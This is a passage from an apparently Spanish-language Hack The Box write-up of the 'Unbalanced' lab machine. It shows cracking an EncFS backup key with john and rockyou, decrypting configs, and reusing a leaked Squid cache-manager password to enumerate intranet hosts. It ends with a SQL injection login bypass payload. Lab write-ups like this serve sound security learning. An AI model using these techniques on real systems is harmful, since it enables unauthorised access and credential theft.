+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>.rw-r--r-- root root 518 B  Sat Apr  4 17:05:31 2020  Kpo3MHQxksW2uYX79XngQu-f
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>.rw-r--r-- root root 340 B  Sat Apr  4 17:05:31 2020  KPYfvxIoOlrRjTY18zi8Wne-
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>.rw-r--r-- root root 1.4 KB Sat Apr  4 17:05:31 2020  KtFc,DR7HqmGdPOkM2CpLaM9
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>.rw-r--r-- root root 612 B  Sat Apr  4 17:05:31 2020  l,LY6YoFepcaLg67YoILNGg0
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>.rw-r--r-- root root  46 B  Sat Apr  4 17:05:31 2020  lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>.rw-r--r-- root root 1.6 KB Sat Apr  4 17:05:31 2020  mMGincizgMjpsBjkhWq-Oy0D
+<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>.rw-r--r-- root root 714 B  Sat Apr  4 17:05:31 2020  Mv5TtpmUNnVl-fgqQeYAy8uu
+<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>.rw-r--r-- root root 289 B  Sat Apr  4 17:05:31 2020  MxgjShAeN6AmkH2tQAsfaj6C
+<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>.rw-r--r-- root root 4.4 KB Sat Apr  4 17:05:31 2020  Ni8LDatT134DF6hhQf5ESpo5
+<a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>.rw-r--r-- root root 2.1 KB Sat Apr  4 17:05:31 2020  Nlne5rpWkOxkPNC15SEeJ8g,
+<a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>.rw-r--r-- root root 199 B  Sat Apr  4 17:05:32 2020  OFG2vAoaW3Tvv1X2J5fy4UV8
+<a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>.rw-r--r-- root root 1.7 KB Sat Apr  4 17:05:31 2020  oPu0EVyHA6,KmoI1T,LTs83x
+<a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>.rw-r--r-- root root 914 B  Sat Apr  4 17:05:32 2020  OvBqims-kvgGyJJqZ59IbGfy
+<a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>.rw-r--r-- root root  52 B  Sat Apr  4 17:05:31 2020  pfTT,nZnCUFzyPPOeX9NwQVo
+<a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>.rw-r--r-- root root 1.0 KB Sat Apr  4 17:05:31 2020  pn6YPUx69xqxRXKqg5B5D2ON
+<a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>.rw-r--r-- root root 650 B  Sat Apr  4 17:05:31 2020  q5RFgoRK2Ttl3U5W8fjtyriX
+<a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a>.rw-r--r-- root root 660 B  Sat Apr  4 17:05:32 2020  qeHNkZencKDjkr3R746ZzO5K
+<a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a>.rw-r--r-- root root 820 B  Sat Apr  4 17:05:32 2020  sfT89u8dsEY4n99lNsUFOwki
+<a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a>.rw-r--r-- root root 2.9 KB Sat Apr  4 17:05:32 2020  sNiR-scp-DZrXHg4coa9KBmZ
+<a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>.rw-r--r-- root root 427 B  Sat Apr  4 17:05:31 2020  StlxkG05UY9zWNHBhXxukuP9
+<a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a>.rw-r--r-- root root  17 B  Sat Apr  4 17:05:31 2020  TZGfSHeAM42o9TgjGUdOSdrd
+<a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>.rw-r--r-- root root 254 B  Sat Apr  4 17:05:31 2020  uEtPZwC2tjaQELJmnNRTCLYU
+<a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a>.rw-r--r-- root root 203 B  Sat Apr  4 17:05:31 2020  vCsXjR1qQmPO5g3P3kiFyO84
+<a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a>.rw-r--r-- root root 309 KB Sat Apr  4 17:05:31 2020  VQjGnKU1puKhF6pQG1aah6rc
+<a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a>.rw-r--r-- root root 2.0 KB Sat Apr  4 17:05:31 2020  W5,ILrUB4dBVW-Jby5AUcGsz
+<a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>.rw-r--r-- root root 670 B  Sat Apr  4 17:05:32 2020  waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5
+<a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a>.rw-r--r-- root root 685 B  Sat Apr  4 17:05:31 2020  Wr0grx0GnkLFl8qT3L0CyTE6
+<a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>.rw-r--r-- root root 798 B  Sat Apr  4 17:05:31 2020  X93-uArUSTL,kiJpOeovWTaP
+<a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a>.rw-r--r-- root root 1.6 KB Sat Apr  4 17:05:31 2020  Ya30M5le2NKbF6rD-qD3M-7t
+<a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a>.rw-r--r-- root root 1.9 KB Sat Apr  4 17:05:31 2020  Yw0UEJYKN,Hjf-QGqo3WObHy
+<a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a>.rw-r--r-- root root 128 B  Sat Apr  4 17:05:31 2020  Z8,hYzUjW0GnBk1JP,8ghCsC
+<a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>.rw-r--r-- root root  42 B  Sat Apr  4 17:05:31 2020  ZvkMNEBKPRpOHbGoefPa737T
+<a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a>.rw-r--r-- root root 2.9 KB Sat Apr  4 17:05:31 2020  ZXUUpn9SCTerl0dinZQYwxrx
+</code></pre></div>
+</li>
+<li>
+<p>Todo cifrado excepto el directorio oculto .encfs6.xml:</p>
+<blockquote>
+<p><code>Aqui se indica la aplicación usada (EncFS 1.9.5) para cifrar y sus keys correspondientes</code> </p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>&lt;!DOCTYPE boost_serialization&gt;
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>&lt;boost_serialization signature=&quot;serialization::archive&quot; version=&quot;7&quot;&gt;
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    &lt;cfg class_id=&quot;0&quot; tracking_level=&quot;0&quot; version=&quot;20&quot;&gt;
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        &lt;version&gt;20100713&lt;/version&gt;
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>        &lt;creator&gt;EncFS 1.9.5&lt;/creator&gt;
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>        &lt;cipherAlg class_id=&quot;1&quot; tracking_level=&quot;0&quot; version=&quot;0&quot;&gt;
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>            &lt;name&gt;ssl/aes&lt;/name&gt;
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>            &lt;major&gt;3&lt;/major&gt;
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>            &lt;minor&gt;0&lt;/minor&gt;
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>        &lt;/cipherAlg&gt;
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>        &lt;nameAlg&gt;
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>            &lt;name&gt;nameio/block&lt;/name&gt;
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>            &lt;major&gt;4&lt;/major&gt;
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>            &lt;minor&gt;0&lt;/minor&gt;
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>        &lt;/nameAlg&gt;
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>        &lt;keySize&gt;192&lt;/keySize&gt;
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>        &lt;blockSize&gt;1024&lt;/blockSize&gt;
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>        &lt;plainData&gt;0&lt;/plainData&gt;
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>        &lt;uniqueIV&gt;1&lt;/uniqueIV&gt;
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>        &lt;chainedNameIV&gt;1&lt;/chainedNameIV&gt;
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>        &lt;externalIVChaining&gt;0&lt;/externalIVChaining&gt;
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>        &lt;blockMACBytes&gt;0&lt;/blockMACBytes&gt;
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>        &lt;blockMACRandBytes&gt;0&lt;/blockMACRandBytes&gt;
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>        &lt;allowHoles&gt;1&lt;/allowHoles&gt;
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>        &lt;encodedKeySize&gt;44&lt;/encodedKeySize&gt;
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>        &lt;encodedKeyData&gt;GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=&lt;/encodedKeyData&gt;
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>        &lt;saltLen&gt;20&lt;/saltLen&gt;
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>        &lt;saltData&gt;mRdqbk2WwLMrrZ1P6z2OQlFl8QU=&lt;/saltData&gt;
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>        &lt;kdfIterations&gt;580280&lt;/kdfIterations&gt;
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>        &lt;desiredKDFDuration&gt;500&lt;/desiredKDFDuration&gt;
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>    &lt;/cfg&gt;
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>&lt;/boost_serialization&gt;
+</code></pre></div>
+</li>
+</ul>
+<h2 id="cracking-key">Cracking KEY</h2>
+<ul>
+<li>
+<p>Se procede a extraer el hash y crackearlo:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python /usr/share/john/encfs2john.py .          
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>.:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>python /usr/share/john/encfs2john.py . &gt; hash_EncFS
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>john -w=/usr/share/wordlists/rockyou.txt hash_EncFS 
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>Using default input encoding: UTF-8
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>Cost 1 (iteration count) is 580280 for all loaded hashes
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Will run 2 OpenMP threads
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>bubblegum        (.)
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>1g 0:00:00:21 DONE (2022-08-01 02:43) 0.04677g/s 33.67p/s 33.67c/s 33.67C/s bambam..marissa
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>Session completed
+</code></pre></div>
+</li>
+</ul>
+<h2 id="descifrar-data-con-encfs">Descifrar data con encFS</h2>
+<ul>
+<li>
+<p>Tras revisar la documentación y obtener la clave procedemos a desencriptar la data:</p>
+<blockquote>
+<p><code>encfs /home/x/Documentos/htb/unbalanced/mycopy /home/x/Documentos/htb/unbalanced/descifrado</code>  </p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Contraseña EncFS: ********* (bubblegum)
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>ls descifrado   
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a> 50-localauthority.conf               debconf.conf                     fuse.conf         libaudit.conf      networkd.conf                     rsyncd.conf      udev.conf
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a> 50-nullbackend.conf                  debian.conf                      gai.conf          libc.conf          nsswitch.conf                     rsyslog.conf     update-initramfs.conf
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a> 51-debian-sudo.conf                  deluser.conf                     group.conf        limits.conf        org.freedesktop.PackageKit.conf   semanage.conf    user-dirs.conf
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a> 70debconf                            dhclient.conf                    hdparm.conf       listchanges.conf   PackageKit.conf                   sepermit.conf    user.conf
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a> 99-sysctl.conf                       discover-modprobe.conf           host.conf         logind.conf        pam.conf                          sleep.conf       Vendor.conf
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a> access.conf                          dkms.conf                        initramfs.conf    logrotate.conf     pam_env.conf                      squid.conf       wpa_supplicant.conf
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a> adduser.conf                         dns.conf                         input.conf        main.conf          parser.conf                       sysctl.conf      x86_64-linux-gnu.conf
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a> bluetooth.conf                       dnsmasq.conf                     journald.conf     mke2fs.conf        protect-links.conf                system.conf      xattr.conf
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a> ca-certificates.conf                 docker.conf                      kernel-img.conf   modules.conf       reportbug.conf                    time.conf       
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a> com.ubuntu.SoftwareProperties.conf   fakeroot-x86_64-linux-gnu.conf   ld.so.conf        namespace.conf     resolv.conf                       timesyncd.conf  
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a> dconf                                framework.conf                   ldap.conf         network.conf       resolved.conf                     ucf.conf  
+</code></pre></div>
+</li>
+<li>
+<p>Se obtiene la configuración de squidproxy:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>cat squid.conf | grep -v &#39;#&#39; | awk /./    
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>acl SSL_ports port 443
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>acl CONNECT method CONNECT
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>http_access deny !Safe_ports
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>http_access deny CONNECT !SSL_ports
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>http_access allow manager
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>include /etc/squid/conf.d/*
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>http_access allow localhost
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>acl intranet dstdomain -n intranet.unbalanced.htb
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>acl intranet_net dst -n 172.16.0.0/12
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>http_access allow intranet
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>http_access allow intranet_net
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>http_access deny all
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>http_port 3128
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>coredump_dir /var/spool/squid
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>refresh_pattern ^ftp:       1440    20% 10080
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>refresh_pattern ^gopher:    1440    0%  1440
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>refresh_pattern -i (/cgi-bin/|\?) 0 0%  0
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>refresh_pattern .       0   20% 4320
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>cachemgr_passwd disable all
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>cache disable
+</code></pre></div>
+</li>
+<li>
+<p>Se configura el squidproxy en el foxyproxy por http, host 10.10.10.200, port 3128:</p>
+<p><img alt="" src="../images/squidproxy.png" title="Leyenda de la imagen" /></p>
+</li>
+<li>
+<p>Acceso con autenticación a funcionalidades de SquidProxy:</p>
+<blockquote>
+<p><code>curl -s http://10.10.10.200:3128/squid-internal-mgr/menu -u 'cache_mgr:Thah$Sh1'| grep -v disabled</code></p>
+</blockquote>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a> menu                   Cache Manager Menu                  protected
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a> pconn                  Persistent Connection Utilization Histograms    protected
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a> mem                    Memory Utilization                  protected
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a> diskd                  DISKD Stats                         protected
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a> fqdncache              FQDN Cache Stats and Contents       protected
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a> filedescriptors        Process Filedescriptor Allocation   protected
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a> objects                All Cache Objects                   protected
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a> vm_objects             In-Memory and In-Transit Objects    protected
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a> counters               Traffic and Resource Counters       protected
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a> 5min                   5 Minute Average of Counters        protected
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a> 60min                  60 Minute Average of Counters       protected
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a> histograms             Full Histogram Counts               protected
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a> cbdata                 Callback Data Registry Contents     protected
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a> sbuf                   String-Buffer statistics            protected
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a> events                 Event Queue                         protected
+</code></pre></div>
+* Se pueden ver las ips y dns de los hosts:</p>
+<blockquote>
+<p><code>curl -s http://10.10.10.200:3128/squid-internal-mgr/fqdncache -u 'cache_mgr:Thah$Sh1'</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>FQDN Cache Statistics:
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>FQDNcache Entries In Use: 10
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>FQDNcache Entries Cached: 9
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>FQDNcache Requests: 361
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>FQDNcache Hits: 0
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>FQDNcache Negative Hits: 171
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>FQDNcache Misses: 190
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>FQDN Cache Contents:
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>Address                                       Flg TTL Cnt Hostnames
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>::1                                             H -001   3 localhost ip6-localhost ip6-loopback
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>10.10.10.200                                   N  -797   0
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>127.0.0.1                                       H -001   1 localhost
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>172.17.0.1                                      H -001   1 intranet.unbalanced.htb
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>ff02::1                                         H -001   1 ip6-allnodes
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>ff02::2                                         H -001   1 ip6-allrouters
+</code></pre></div>
+</li>
+<li>
+<p>Realizando un curl a través del proxy a las al rango de direcciones que hemos visto 172.31.179.x se puede ver que hay un nodo en mantenimiento(desarrollo):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl --proxy 10.10.10.200:3128 172.31.179.1
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Host temporarily taken out of load balancing for security maintenance.
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>curl --proxy 10.10.10.200:3128 172.31.179.2/intranet.php
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>&lt;!DOCTYPE html&gt;
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>&lt;html lang=&quot;en&quot;&gt;
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>&lt;title&gt;Unbalanced Design. Intranet.&lt;/title&gt;
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>&lt;meta charset=&quot;UTF-8&quot;&gt;
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+</code></pre></div>
+</li>
+</ul>
+<h2 id="sqli-en-nodo-en-mantenimiento">SQLi en nodo en mantenimiento</h2>
+<ul>
+<li>
+<p>Se observa un tamaño de respuesta diferente en el campo password al insertar una comilla, tras realizar la inyección con Burp estos son los resultados:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>POST http://172.31.179.1/intranet.php HTTP/1.1
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Host: 172.31.179.1
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>User-Agent: Mozilla/4.77 en (X11; U; Linux 2.4.9 i686)
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>Accept-Language: en-US,en;q=0.5
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>Content-Type: application/x-www-form-urlencoded
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>Content-Length: 43
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>Origin: http://172.31.179.1
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>DNT: 1
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>Connection: close
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>Referer: http://172.31.179.1/intranet.php
+<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>
+<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>Upgrade-Insecure-Requests: 1
+<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>
+<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>Sec-GPC: 1
+<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
+<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>Username=admin&amp;Password=&#39;or&#39;1&#39;=&#39;1
+</code></pre></div>
+</li>
+<li>
